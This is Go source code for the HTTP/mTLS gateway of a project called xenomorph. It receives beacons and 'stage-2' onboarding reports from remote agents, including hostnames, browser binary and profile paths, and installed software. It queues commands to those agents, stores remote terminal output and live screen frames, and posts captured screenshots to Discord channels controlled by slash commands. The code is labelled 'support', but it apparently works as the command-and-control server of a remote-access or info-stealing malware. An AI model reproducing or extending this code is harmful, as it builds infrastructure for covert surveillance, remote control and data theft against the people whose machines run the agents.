// Package transport owns the HTTP/mTLS transport layer for the gateway. It
// handles request authentication, agent identity extraction, event ingestion,
// command queue dispatching, and Discord command forwarding.
package transport

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"

	"github.com/bwmarrin/discordgo"
	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
	"github.com/gorilla/websocket"
	"google.golang.org/protobuf/types/known/timestamppb"

	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/broker"
	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/command"
	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/identity"
	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/provider"
	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/provider/discord"
	"github.com/codevault-llc/xenomorph/platform/services/gateway/internal/sdk"
	pb "github.com/codevault-llc/xenomorph/platform/shared/proto/gen/go/platform/v1"
)

const (
	maxCommandIDLen      = 128
	maxTypeLen           = 64
	maxStatusLen         = 32
	maxHostnameLen       = 120
	maxReasonLen         = 512
	maxBrowserNameLen    = 80
	maxPathLen           = 260
	maxAppNameLen        = 120
	maxOSVersionLen      = 120
	maxLogLevelLen       = 16
	maxComponentLen      = 120
	maxLogMessageLen     = 2048
	maxTerminalOutputLen = 128 * 1024

	maxBrowsers = 32
	maxApps     = 200

	readHeaderTimeout           = 30 * time.Second
	commandPollTimeout          = 5 * time.Second
	commandResultForwardTimeout = 10 * time.Second
	maxScreenMediaFrameBytes    = 10 << 20
)

var screenMediaUpgrader = websocket.Upgrader{
	CheckOrigin: func(*http.Request) bool {
		return true
	},
}

// Server owns the HTTP transport layer for the gateway. It handles mTLS
// termination, agent identity extraction, request routing, and event
// publishing to the NATS broker.
type Server struct {
	broker         *broker.NATS
	notifier       *provider.Fanout
	commandQueue   *command.Queue
	discordPoster  provider.DiscordPoster
	statusProvider agentStatusProvider
	screenStore    *ScreenStore
	screenSessions *ScreenSessions
	logStore       *AgentLogStore
	terminalStore  *TerminalStore
	engine         *gin.Engine

	seenMu     sync.Mutex
	seenAgents map[string]struct{}
}

// agentStatusProvider is the interface the Server requires for agent presence
// queries. The activity.Monitor implements this interface.
type agentStatusProvider interface {
	Snapshot(agentID string) (provider.AgentSnapshot, bool)
}

// NewServer constructs a Server with the given dependencies. All parameters
// are required except notifier (defaults to no-op Fanout) and discordPoster
// (nil is valid when Discord is not configured).
func NewServer(b *broker.NATS, notifier *provider.Fanout, commandQueue *command.Queue, discordPoster provider.DiscordPoster, statusProvider agentStatusProvider) *Server {
	if notifier == nil {
		notifier = provider.NewFanout(nil)
	}

	s := &Server{
		broker:         b,
		notifier:       notifier,
		commandQueue:   commandQueue,
		discordPoster:  discordPoster,
		statusProvider: statusProvider,
		screenStore:    NewScreenStore(),
		screenSessions: NewScreenSessions(),
		logStore:       NewAgentLogStore(maxLogEntriesPerAgent),
		terminalStore:  NewTerminalStore(),
		engine:         gin.Default(),
		seenAgents:     make(map[string]struct{}),
	}
	s.routes()
	return s
}

// routes registers all HTTP middleware and endpoints on the Gin engine.
//
// Middleware execution order:
//  1. traceMiddleware — injects trace_id from X-Trace-ID header or generates one.
//  2. mtlsMiddleware — authenticates the client via mTLS peer certificate.
//
// Endpoints:
//
//	POST /ingest/heartbeat   — accepts agent heartbeat payloads.
//	POST /ingest/entry       — accepts stage-2 onboarding reports.
//	POST /ingest/logs        — accepts client diagnostic log entries.
//	GET  /commands/next      — dequeues the next pending command for an agent.
//	POST /commands/result    — accepts command execution results.
//	GET  /screen/media       — accepts authenticated live screen media frames.
func (s *Server) routes() {
	s.engine.Use(s.traceMiddleware)
	s.engine.Use(s.mtlsMiddleware)

	s.engine.POST("/ingest/heartbeat", s.handleHeartbeat)
	s.engine.POST("/ingest/entry", s.handleEntry)
	s.engine.POST("/ingest/logs", s.handleLogEntry)
	s.engine.GET("/commands/next", s.handleNextCommand)
	s.engine.POST("/commands/result", s.handleCommandResult)
	s.engine.GET("/screen/media", s.handleScreenMedia)
}

// handleLogEntry processes an authenticated client diagnostic log entry.
//
// The agent identity and client IP are extracted from the mTLS session. Level,
// component, and message are client-authored payload fields and are normalized
// before publication and dashboard storage.
func (s *Server) handleLogEntry(c *gin.Context) {
	agentID := c.GetString("agent_id")
	if agentID == "" {
		c.JSON(http.StatusForbidden, gin.H{"error": "missing authenticated agent identity"})
		return
	}

	var req pb.LogEntry
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid schema"})
		return
	}

	logEntry := normalizeLogEntry(&req)
	env := &pb.EventEnvelope{
		EventId:   uuid.New().String(),
		TraceId:   c.GetHeader("X-Trace-ID"),
		Timestamp: timestamppb.Now(),
		Security: &pb.SecurityContext{
			AgentId:         agentID,
			SessionId:       uuid.New().String(),
			ClientIp:        c.ClientIP(),
			IsAuthenticated: true,
		},
		Payload: &pb.EventEnvelope_LogEntry{LogEntry: logEntry},
	}

	subject := "sys.in.default." + agentID + ".logs"
	if err := s.broker.Publish(subject, env); err != nil {
		slog.ErrorContext(c.Request.Context(), "client log publish failed",
			"agent_id", agentID,
			"error", err,
		)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to queue event"})
		return
	}

	s.storeLogEnvelope(env)

	c.JSON(http.StatusAccepted, gin.H{"status": "accepted", "event_id": env.EventId})
}

// traceMiddleware extracts the X-Trace-ID header from the incoming request
// and stores it in both the Gin context and the request context. When the
// header is absent, a new UUID is generated.
//
// The trace ID is set on the response header and automatically injected into
// all log records produced by the slog context handler.
func (s *Server) traceMiddleware(c *gin.Context) {
	traceID := c.GetHeader("X-Trace-ID")
	if traceID == "" {
		traceID = uuid.New().String()
	}
	c.Set("trace_id", traceID)
	c.Header("X-Trace-ID", traceID)
	c.Request = c.Request.WithContext(sdk.WithTraceID(c.Request.Context(), traceID))
	c.Next()
}

// mtlsMiddleware authenticates every request using the mTLS peer certificate.
// The agent identity is derived deterministically from the certificate
// fingerprint and stored in the Gin context for downstream handlers.
//
// The middleware aborts with HTTP 403 when:
//   - The TLS connection has no peer certificates (plain HTTP or no client cert).
//   - The peer certificate cannot be parsed into a valid agent identity.
//
// Downstream handlers access the authenticated identity through Gin context
// keys: "agent_id", "agent_cert_fingerprint_sha256", "agent_subject_cn".
func (s *Server) mtlsMiddleware(c *gin.Context) {
	if c.Request.TLS != nil && len(c.Request.TLS.PeerCertificates) > 0 {
		cert := c.Request.TLS.PeerCertificates[0]
		authenticatedAgent, err := identity.FromPeerCertificate(cert)
		if err != nil {
			slog.ErrorContext(c.Request.Context(), "invalid client certificate identity",
				"error", err,
			)
			c.AbortWithStatusJSON(http.StatusForbidden, gin.H{"error": "invalid client certificate identity"})
			return
		}

		c.Set("agent_id", authenticatedAgent.ID)
		c.Set("agent_cert_fingerprint_sha256", authenticatedAgent.FingerprintSHA256)
		c.Set("agent_subject_cn", authenticatedAgent.SubjectCommonName)
	} else {
		c.AbortWithStatusJSON(http.StatusForbidden, gin.H{"error": "mTLS required"})
		return
	}
	c.Next()
}

// handleHeartbeat processes an authenticated heartbeat submission.
//
// The agent identity is extracted from the mTLS peer certificate (set by
// mtlsMiddleware). No client-supplied identity fields in the request body
// are trusted. The heartbeat is wrapped in a server-authored EventEnvelope
// with the authenticated agent ID and published to NATS on subject
// "sys.in.default.<agentID>.heartbeat".
//
// Expected request body: proto.Heartbeat JSON representation.
// Response: 202 Accepted with event_id and is_new_agent flags.
func (s *Server) handleHeartbeat(c *gin.Context) {
	agentID := c.GetString("agent_id")
	if agentID == "" {
		c.JSON(http.StatusForbidden, gin.H{"error": "missing authenticated agent identity"})
		return
	}

	var hb pb.Heartbeat
	if err := c.ShouldBindJSON(&hb); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid schema"})
		return
	}

	env := &pb.EventEnvelope{
		EventId:   uuid.New().String(),
		TraceId:   c.GetHeader("X-Trace-ID"),
		Timestamp: timestamppb.Now(),
		Security: &pb.SecurityContext{
			AgentId:         agentID,
			SessionId:       uuid.New().String(),
			ClientIp:        c.ClientIP(),
			IsAuthenticated: true,
		},
		Payload: &pb.EventEnvelope_Heartbeat{Heartbeat: &hb},
	}

	subject := "sys.in.default." + agentID + ".heartbeat"
	if err := s.broker.Publish(subject, env); err != nil {
		slog.ErrorContext(c.Request.Context(), "heartbeat publish failed",
			"agent_id", agentID,
			"error", err,
		)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to queue event"})
		return
	}

	_, existed := s.markSeen(agentID)

	c.JSON(http.StatusAccepted, gin.H{
		"status":       "accepted",
		"event_id":     env.EventId,
		"is_new_agent": !existed,
	})
}

// entryBrowser is the JSON shape for a browser entry in the onboarding report.
type entryBrowser struct {
	Name       string `json:"name"`
	BinaryPath string `json:"binary_path"`
	ProfileDir string `json:"profile_dir"`
}

// entryRequest is the JSON shape for the stage-2 onboarding submission.
type entryRequest struct {
	Hostname              string         `json:"hostname" binding:"required"`
	OSVersion             string         `json:"os_version"`
	IsNewAgent            bool           `json:"is_new_agent"`
	Browsers              []entryBrowser `json:"browsers"`
	InstalledApplications []string       `json:"installed_applications"`
}

// handleEntry processes an authenticated stage-2 onboarding report.
//
// The agent identity is extracted from the mTLS session. The request body
// is validated and normalized through normalizeEntryRequest, which applies
// length limits to every text field. The normalized report is published to
// NATS and forwarded to notification providers that implement EntryReporter.
//
// Expected request body: entryRequest JSON.
// Response: 202 Accepted with event_id.
func (s *Server) handleEntry(c *gin.Context) {
	agentID := c.GetString("agent_id")
	if agentID == "" {
		c.JSON(http.StatusForbidden, gin.H{"error": "missing authenticated agent identity"})
		return
	}

	var req entryRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid schema"})
		return
	}

	report := normalizeEntryRequest(agentID, req)

	env := &pb.EventEnvelope{
		EventId:   uuid.New().String(),
		TraceId:   c.GetHeader("X-Trace-ID"),
		Timestamp: timestamppb.New(report.OccurredAt),
		Security: &pb.SecurityContext{
			AgentId:         agentID,
			SessionId:       uuid.New().String(),
			ClientIp:        c.ClientIP(),
			IsAuthenticated: true,
		},
		Payload: &pb.EventEnvelope_LogEntry{LogEntry: &pb.LogEntry{
			Level:     "INFO",
			Component: "gateway.ingest.entry",
			Message: fmt.Sprintf(
				"stage2 entry accepted hostname=%s browsers=%d apps=%d is_new_agent=%t",
				report.Hostname,
				len(report.Browsers),
				len(report.InstalledApplications),
				report.IsNewAgent,
			),
		}},
	}

	subject := "sys.in.default." + agentID + ".entry"
	if err := s.broker.Publish(subject, env); err != nil {
		slog.ErrorContext(c.Request.Context(), "entry publish failed",
			"agent_id", agentID,
			"error", err,
		)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to queue event"})
		return
	}

	s.storeLogEnvelope(env)

	if err := s.notifier.ReportEntry(c.Request.Context(), report); err != nil {
		slog.ErrorContext(c.Request.Context(), "entry notification delivery failed",
			"agent_id", agentID,
			"error", err,
		)
	}

	c.JSON(http.StatusAccepted, gin.H{"status": "accepted", "event_id": env.EventId})
}

// handleNextCommand dequeues the next pending command for the authenticated
// agent. Returns 204 No Content when the queue is empty.
func (s *Server) handleNextCommand(c *gin.Context) {
	agentID := c.GetString("agent_id")
	if agentID == "" {
		c.JSON(http.StatusForbidden, gin.H{"error": "missing authenticated agent identity"})
		return
	}

	if s.commandQueue == nil {
		c.Status(http.StatusNoContent)
		return
	}

	ctx, cancel := context.WithTimeout(c.Request.Context(), commandPollTimeout)
	defer cancel()

	cmd := s.commandQueue.WaitDequeue(ctx, agentID)
	if cmd == nil {
		c.Status(http.StatusNoContent)
		return
	}

	c.JSON(http.StatusOK, cmd)
}

// commandResultRequest is the JSON shape for a command execution result.
type commandResultRequest struct {
	CommandID                string `json:"command_id" binding:"required"`
	Type                     string `json:"type" binding:"required"`
	Status                   string `json:"status" binding:"required"`
	Reason                   string `json:"reason"`
	ClientHostname           string `json:"client_hostname"`
	OutputData               []byte `json:"output_data,omitempty"`
	TerminalSessionID        string `json:"terminal_session_id"`
	TerminalShell            string `json:"terminal_shell"`
	TerminalCommand          string `json:"terminal_command"`
	TerminalWorkingDirectory string `json:"terminal_working_directory"`
	TerminalExitCode         int    `json:"terminal_exit_code"`
}

// handleCommandResult processes an authenticated command execution result.
//
// The result is published as an audit log entry to NATS. When the result
// includes screenshot output data and a Discord poster is configured, the
// screenshot is forwarded to the agent's Discord commands channel.
func (s *Server) handleCommandResult(c *gin.Context) {
	agentID := c.GetString("agent_id")
	if agentID == "" {
		c.JSON(http.StatusForbidden, gin.H{"error": "missing authenticated agent identity"})
		return
	}

	var req commandResultRequest
	if err := c.ShouldBindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "Invalid schema"})
		return
	}

	message := fmt.Sprintf(
		"command_result command_id=%s type=%s status=%s hostname=%s reason=%s output_bytes=%d",
		clampText(req.CommandID, maxCommandIDLen),
		clampText(req.Type, maxTypeLen),
		clampText(req.Status, maxStatusLen),
		clampText(req.ClientHostname, maxHostnameLen),
		clampText(req.Reason, maxReasonLen),
		len(req.OutputData),
	)

	env := &pb.EventEnvelope{
		EventId:   uuid.New().String(),
		TraceId:   c.GetHeader("X-Trace-ID"),
		Timestamp: timestamppb.Now(),
		Security: &pb.SecurityContext{
			AgentId:         agentID,
			SessionId:       uuid.New().String(),
			ClientIp:        c.ClientIP(),
			IsAuthenticated: true,
		},
		Payload: &pb.EventEnvelope_LogEntry{LogEntry: &pb.LogEntry{
			Level:     "INFO",
			Component: "gateway.command.audit",
			Message:   message,
		}},
	}

	subject := "sys.in.default." + agentID + ".command.audit"
	if err := s.broker.Publish(subject, env); err != nil {
		slog.ErrorContext(c.Request.Context(), "command result publish failed",
			"agent_id", agentID,
			"command_id", req.CommandID,
			"error", err,
		)
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to queue event"})
		return
	}

	s.storeLogEnvelope(env)

	if req.Type == "support.request_screenshot" && req.Status == "executed" && len(req.OutputData) > 0 {
		s.screenStore.Save(agentID, ScreenFrame{
			AgentID:    agentID,
			CommandID:  req.CommandID,
			CapturedAt: time.Now().UTC(),
			Content:    append([]byte(nil), req.OutputData...),
		})
	}
	if req.Type == "support.terminal.run" {
		s.storeTerminalResult(agentID, req)
	}
	if req.Type == "support.request_screenshot" && len(req.OutputData) > 0 && s.discordPoster != nil {
		go func() {
			ctx, cancel := context.WithTimeout(context.Background(), commandResultForwardTimeout)
			defer cancel()
			s.forwardScreenshotToDiscord(ctx, agentID, req)
		}()
	}

	c.JSON(http.StatusAccepted, gin.H{"status": "accepted", "event_id": env.EventId})
}

// handleScreenMedia receives binary live screen frames from an authenticated
// agent over the media plane. The agent identity is derived from mTLS; frame
// bytes are agent-authored opaque media data and are only stored in memory.
func (s *Server) handleScreenMedia(c *gin.Context) {
	agentID := c.GetString("agent_id")
	if agentID == "" {
		c.JSON(http.StatusForbidden, gin.H{"error": "missing authenticated agent identity"})
		return
	}

	conn, err := screenMediaUpgrader.Upgrade(c.Writer, c.Request, nil)
	if err != nil {
		slog.WarnContext(c.Request.Context(), "screen media upgrade failed",
			"agent_id", agentID,
			"error", err,
		)
		return
	}
	defer func() { _ = conn.Close() }()
	conn.SetReadLimit(maxScreenMediaFrameBytes)

	contentType := c.Query("content_type")
	if contentType == "" {
		contentType = "image/png"
	}

	for {
		messageType, data, err := conn.ReadMessage()
		if err != nil {
			return
		}
		if messageType != websocket.BinaryMessage || len(data) == 0 {
			continue
		}

		s.screenStore.Save(agentID, ScreenFrame{
			AgentID:     agentID,
			CapturedAt:  time.Now().UTC(),
			ContentType: contentType,
			Content:     append([]byte(nil), data...),
		})
	}
}

// DashboardRuntime exposes browser dashboard dependencies without giving the
// dashboard direct access to the mTLS HTTP handlers.
func (s *Server) DashboardRuntime() DashboardRuntime {
	directory, _ := s.statusProvider.(ClientDirectory)
	return DashboardRuntime{
		Directory:    directory,
		CommandQueue: s.commandQueue,
		Screens:      s.screenStore,
		Sessions:     s.screenSessions,
		Logs:         s.logStore,
		Terminals:    s.terminalStore,
	}
}

func (s *Server) storeTerminalResult(agentID string, req commandResultRequest) {
	if s == nil || s.terminalStore == nil {
		return
	}
	s.terminalStore.Complete(agentID, req.CommandID, TerminalEntry{
		AgentID:          agentID,
		SessionID:        clampText(strings.TrimSpace(req.TerminalSessionID), maxCommandIDLen),
		CommandID:        clampText(strings.TrimSpace(req.CommandID), maxCommandIDLen),
		Command:          clampText(strings.TrimSpace(req.TerminalCommand), maxLogMessageLen),
		Shell:            normalizeTerminalShell(req.TerminalShell),
		WorkingDirectory: clampText(strings.TrimSpace(req.TerminalWorkingDirectory), maxPathLen),
		Status:           clampText(strings.TrimSpace(req.Status), maxStatusLen),
		ExitCode:         req.TerminalExitCode,
		OutputLog:        clampTerminalOutput(req.OutputData, maxTerminalOutputLen),
		Reason:           clampText(strings.TrimSpace(req.Reason), maxReasonLen),
	})
}

func (s *Server) storeLogEnvelope(env *pb.EventEnvelope) {
	if s == nil || s.logStore == nil || env == nil || env.Security == nil {
		return
	}

	entry := env.GetLogEntry()
	if entry == nil {
		return
	}

	observedAt := time.Now().UTC()
	if env.Timestamp != nil {
		observedAt = env.Timestamp.AsTime()
	}

	s.logStore.Append(AgentLogEntry{
		EventID:    env.EventId,
		AgentID:    env.Security.AgentId,
		ClientIP:   env.Security.ClientIp,
		ObservedAt: observedAt,
		Level:      entry.Level,
		Component:  entry.Component,
		Message:    entry.Message,
	})
}

func normalizeLogEntry(entry *pb.LogEntry) *pb.LogEntry {
	if entry == nil {
		return &pb.LogEntry{Level: "INFO", Component: "client", Message: ""}
	}

	level := strings.ToUpper(clampText(strings.TrimSpace(entry.Level), maxLogLevelLen))
	switch level {
	case "DEBUG", "INFO", "WARN", "ERROR":
	default:
		level = "INFO"
	}

	component := clampText(strings.TrimSpace(entry.Component), maxComponentLen)
	if component == "" {
		component = "client"
	}

	return &pb.LogEntry{
		Level:     level,
		Component: component,
		Message:   clampText(strings.TrimSpace(entry.Message), maxLogMessageLen),
	}
}

// forwardScreenshotToDiscord sends a command result screenshot to the agent's
// Discord commands channel. The function is a no-op when the agent has no
// mapped Discord commands channel or when the Discord poster is nil.
//
// Security: screenshot output data originates from a remote agent and is
// forwarded as-is. The data is treated as opaque bytes and no content
// inspection is performed before forwarding to Discord.
func (s *Server) forwardScreenshotToDiscord(ctx context.Context, agentID string, req commandResultRequest) {
	channelID, ok := s.discordPoster.CommandsChannelID(agentID)
	if !ok {
		slog.WarnContext(ctx, "no Discord commands channel found for agent; screenshot not forwarded",
			"agent_id", agentID,
		)
		return
	}

	if req.Status != "executed" {
		_ = s.discordPoster.SendChannelMessage(ctx, channelID,
			fmt.Sprintf("Screenshot request **%s** was **%s**: %s", req.CommandID, req.Status, req.Reason))
		return
	}

	if len(req.OutputData) == 0 {
		_ = s.discordPoster.SendChannelMessage(ctx, channelID, "Screenshot returned empty data")
		return
	}

	fileName := fmt.Sprintf("screenshot_%s.png", time.Now().UTC().Format("20060102_150405"))
	caption := fmt.Sprintf("Screenshot captured from **%s** (command: `%s`)", req.ClientHostname, req.CommandID)
	if err := s.discordPoster.SendChannelFile(ctx, channelID, fileName, req.OutputData, caption); err != nil {
		slog.ErrorContext(ctx, "failed to post screenshot to Discord",
			"agent_id", agentID,
			"command_id", req.CommandID,
			"error", err,
		)
	}
}

// interactionRespond is a helper that sends an embed response to a Discord
// interaction. Returns nil when discordPoster is nil.
func (s *Server) interactionRespond(ctx context.Context, interaction *discordgo.Interaction, embed map[string]any) error {
	if s.discordPoster == nil {
		return nil
	}
	return s.discordPoster.RespondInteraction(ctx, interaction.ID, interaction.Token, embed)
}

// extractInteractionOption extracts a typed option value from a Discord
// interaction's application command data. Returns the option value and true
// when found, or zero value and false when not present.
func extractInteractionOption(data discordgo.ApplicationCommandInteractionData, name string) (discordgo.ApplicationCommandInteractionDataOption, bool) {
	for _, opt := range data.Options {
		if opt.Name == name {
			return *opt, true
		}
	}
	return discordgo.ApplicationCommandInteractionDataOption{}, false
}

// HandleDiscordInteraction routes a Discord slash command interaction to the
// appropriate handler based on the command name. Unknown commands return a
// help hint embed.
func (s *Server) HandleDiscordInteraction(ctx context.Context, interaction *discordgo.Interaction, agentID string) error {
	if s.discordPoster == nil {
		return nil
	}

	traceID, _ := ctx.Value("trace_id").(string)

	data := interaction.ApplicationCommandData()

	switch data.Name {
	case "help":
		return s.interactionRespond(ctx, interaction, discord.BuildHelpEmbed(traceID))
	case "status":
		return s.handleDiscordStatusInteraction(ctx, interaction, agentID, traceID)
	case "screenshot":
		return s.handleDiscordScreenshotInteraction(ctx, interaction, agentID, traceID)
	case "ping":
		return s.handleDiscordPingInteraction(ctx, interaction, agentID, traceID)
	case "clean":
		return s.handleDiscordCleanInteraction(ctx, interaction, agentID, traceID)
	default:
		return s.interactionRespond(ctx, interaction, discord.BuildUnknownCommandEmbed(data.Name, traceID))
	}
}

// handleDiscordStatusInteraction responds with the agent's current
// online/offline status as an embed.
func (s *Server) handleDiscordStatusInteraction(ctx context.Context, interaction *discordgo.Interaction, agentID, traceID string) error {
	if s.statusProvider == nil {
		return s.interactionRespond(ctx, interaction, discord.BuildStatusProviderUnavailableEmbed(traceID))
	}

	snapshot, ok := s.statusProvider.Snapshot(agentID)
	if !ok {
		return s.interactionRespond(ctx, interaction, discord.BuildStatusUnknownEmbed(agentID, traceID))
	}

	return s.interactionRespond(ctx, interaction, discord.BuildStatusEmbed(snapshot, traceID))
}

// handleDiscordScreenshotInteraction enqueues a screenshot request for the
// agent and responds with an embed confirmation.
func (s *Server) handleDiscordScreenshotInteraction(ctx context.Context, interaction *discordgo.Interaction, agentID, traceID string) error {
	if s.commandQueue == nil {
		return s.interactionRespond(ctx, interaction, discord.BuildQueueNotAvailableEmbed(traceID))
	}

	userName := ""
	if interaction.Member != nil && interaction.Member.User != nil {
		userName = interaction.Member.User.Username
	} else if interaction.User != nil {
		userName = interaction.User.Username
	}

	cmd := &command.Envelope{
		Type:        "support.request_screenshot",
		RequestedBy: userName,
		Reason:      fmt.Sprintf("Screenshot requested by %s via Discord", userName),
	}
	s.commandQueue.Enqueue(agentID, cmd)

	return s.interactionRespond(ctx, interaction, discord.BuildScreenshotQueuedEmbed(agentID, cmd.CommandID, traceID))
}

// handleDiscordPingInteraction responds with bot latency and optionally
// agent information when the command was issued from an agent's category
// channel.
func (s *Server) handleDiscordPingInteraction(ctx context.Context, interaction *discordgo.Interaction, agentID, traceID string) error {
	botLatency := time.Duration(0)
	if s.discordPoster != nil {
		_, _, err := s.discordPoster.GetBotUser(ctx)
		if err == nil {
			botLatency = time.Duration(0)
		}
	}

	var agentSnapshot *provider.AgentSnapshot
	agentOnline := false
	if s.statusProvider != nil {
		snapshot, ok := s.statusProvider.Snapshot(agentID)
		if ok {
			agentSnapshot = &snapshot
			agentOnline = snapshot.IsOnline
		}
	}

	return s.interactionRespond(ctx, interaction, discord.BuildPingEmbed(botLatency, agentOnline, agentSnapshot, traceID))
}

// handleDiscordCleanInteraction cleans up agent logs and messages. When the
// remove_channels option is set to true, all of the agent's Discord channels
// are also deleted.
func (s *Server) handleDiscordCleanInteraction(ctx context.Context, interaction *discordgo.Interaction, agentID, traceID string) error {
	if s.discordPoster == nil {
		return nil
	}

	removeChannels := false
	data := interaction.ApplicationCommandData()
	if opt, ok := extractInteractionOption(data, "remove_channels"); ok {
		removeChannels = opt.BoolValue()
	}

	if removeChannels {
		sets := s.discordPoster.AllChannelSets()
		if set, ok := sets[agentID]; ok {
			if set.CommandsID != "" {
				_ = s.discordPoster.DeleteChannel(ctx, set.CommandsID)
			}
			if set.LogsID != "" {
				_ = s.discordPoster.DeleteChannel(ctx, set.LogsID)
			}
			if set.UploadsID != "" {
				_ = s.discordPoster.DeleteChannel(ctx, set.UploadsID)
			}
			if set.CategoryID != "" {
				_ = s.discordPoster.DeleteChannel(ctx, set.CategoryID)
			}
		}
	}

	return s.interactionRespond(ctx, interaction, discord.BuildCleanEmbed(agentID, removeChannels, traceID))
}

// markSeen records that an agent has been observed. Returns whether this is
// the first observation (inserted) and whether the agent was previously known
// (existed). Thread-safe.
func (s *Server) markSeen(agentID string) (inserted bool, existed bool) {
	s.seenMu.Lock()
	defer s.seenMu.Unlock()

	_, existed = s.seenAgents[agentID]
	if !existed {
		s.seenAgents[agentID] = struct{}{}
		return true, false
	}

	return false, true
}

// normalizeEntryRequest validates and constrains an entry request into a
// provider.EntryReport. Every client-supplied text field is clamped to a
// maximum length before entering the event pipeline.
//
// Length limits and why:
//   - Hostname: 120 characters (typical FQDN limit per RFC 1035).
//   - OSVersion: 120 characters (free-form, but bounded to prevent abuse).
//   - Browser name: 80 characters.
//   - BinaryPath: 260 characters (Windows MAX_PATH convention).
//   - ProfileDir: 260 characters (same convention).
//   - Application name: 120 characters.
//   - Maximum browsers: 32 (reasonable upper bound for browser enumeration).
//   - Maximum applications: 200 (prevents unbounded memory growth).
func normalizeEntryRequest(agentID string, req entryRequest) provider.EntryReport {
	browsers := make([]provider.BrowserInfo, 0, len(req.Browsers))
	for _, b := range req.Browsers {
		if len(browsers) >= maxBrowsers {
			break
		}

		name := clampText(b.Name, maxBrowserNameLen)
		if name == "" {
			continue
		}

		browsers = append(browsers, provider.BrowserInfo{
			Name:       name,
			BinaryPath: clampText(b.BinaryPath, maxPathLen),
			ProfileDir: clampText(b.ProfileDir, maxPathLen),
		})
	}

	apps := make([]string, 0, len(req.InstalledApplications))
	for _, app := range req.InstalledApplications {
		if len(apps) >= maxApps {
			break
		}

		item := clampText(app, maxAppNameLen)
		if item == "" {
			continue
		}
		apps = append(apps, item)
	}

	return provider.EntryReport{
		AgentID:               agentID,
		Hostname:              clampText(req.Hostname, maxHostnameLen),
		OSVersion:             clampText(req.OSVersion, maxOSVersionLen),
		IsNewAgent:            req.IsNewAgent,
		Browsers:              browsers,
		InstalledApplications: apps,
		OccurredAt:            timestamppb.Now().AsTime(),
		Source:                "entry",
	}
}

// clampText truncates the input to the specified byte length after trimming
// whitespace. Returns an empty string when the trimmed input is empty.
//
// This is the final length gate for client-supplied strings entering the
// event pipeline. Every handler that stores or forwards user-authored text
// must pass the text through clampText with a limit appropriate for the
// downstream consumer.
func clampText(value string, limit int) string {
	trimmed := strings.TrimSpace(value)
	if trimmed == "" {
		return ""
	}
	if len(trimmed) <= limit {
		return trimmed
	}
	return trimmed[:limit]
}

// Run starts the HTTPS listener with strict mTLS enforcement. The server
// loads the CA certificate, server certificate, and server key from certPath.
//
// TLS configuration:
//   - ClientAuth: RequireAndVerifyClientCert (strict mTLS).
//   - MinVersion: TLS 1.3 (no fallback to older versions).
//   - ClientCAs: CA pool built from certPath/ca.crt.
//
// Certificate files expected in certPath:
//   - ca.crt — CA certificate for client verification.
//   - server.crt — server certificate for TLS handshake.
//   - server.key — server private key.
func (s *Server) Run(addr, certPath string) error {
	caCert, err := os.ReadFile(filepath.Clean(filepath.Join(certPath, "ca.crt")))
	if err != nil {
		return fmt.Errorf("read CA certificate: %w", err)
	}

	caCertPool := x509.NewCertPool()
	if ok := caCertPool.AppendCertsFromPEM(caCert); !ok {
		return fmt.Errorf("parse CA certificate: invalid PEM data")
	}

	tlsConfig := &tls.Config{
		ClientCAs:  caCertPool,
		ClientAuth: tls.RequireAndVerifyClientCert,
		MinVersion: tls.VersionTLS13,
	}

	server := &http.Server{
		Addr:              addr,
		Handler:           s.engine,
		TLSConfig:         tlsConfig,
		ReadHeaderTimeout: readHeaderTimeout,
	}
	return server.ListenAndServeTLS(filepath.Join(certPath, "server.crt"), filepath.Join(certPath, "server.key"))
}
